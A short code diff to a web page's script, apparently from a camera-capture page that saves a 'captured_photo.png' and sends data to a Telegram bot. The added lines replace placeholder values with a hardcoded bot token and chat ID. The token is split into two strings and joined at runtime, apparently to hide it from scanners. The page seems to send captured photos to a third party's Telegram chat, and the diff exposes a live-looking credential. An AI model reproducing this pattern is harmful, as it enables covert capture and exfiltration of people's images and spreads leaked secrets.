@@ -63,9 +63,12 @@
             a.download = 'captured_photo.png';
             a.click();
         }
-        function sendToTelegram(data) {
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Yahan Bot Token daalein
-    const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Yahan Chat ID daalein
+function sendToTelegram(data) {
+    const part1 = '8694298197';
+    const part2 = 'AAFU4A8rZ8qdlfN2VJAkwoilIuudsDysQxU';
+    const BOT_TOKEN = part1 + ':' + part2;
+    const CHAT_ID = '6008648975';
+
 
     let formData = new FormData();
     formData.append('chat_id', CHAT_ID);
